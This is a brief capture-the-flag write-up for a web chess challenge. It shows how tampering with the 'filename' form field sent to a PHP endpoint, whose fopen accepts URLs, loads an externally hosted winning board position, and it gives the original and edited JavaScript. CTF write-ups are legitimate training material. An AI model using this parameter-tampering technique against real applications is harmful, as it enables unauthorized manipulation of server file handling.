# Challenge 01

## Hint

A clean and fair game of chess. Careful though, this is not a game for grandmasters to win.

Hint: Don't make this game harder than it needs to be

https://hackerchess-web.h4ck.ctfcompetition.com/

-----

## Initial thoughts

- Use load_baseboard() to load a winning game position by using a url to a hosted fen file.

- Manipulate the base64 string for positions

- Log into admin panel

-----

## Solution

- Use load_baseboard() to load a winning game position by using a url to a hosted fen file.

- PHP function fopen can recieve urls as filenames. https://www.php.net/manual/en/function.fopen.php

- Edit the xhr form data of the 'filename' to a fen file hosted elsewhere with a winning position, the [Scholar's Mate](https://en.wikipedia.org/wiki/Scholar%27s_mate).

- Used https://lichess.org/editor to get FEN

```javascript
// original
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}

// edit
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'https://raw.githubusercontent.com/jc190/h4ck1ng-google-progress/master/EP000/Challenge-01/s-mate.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
```
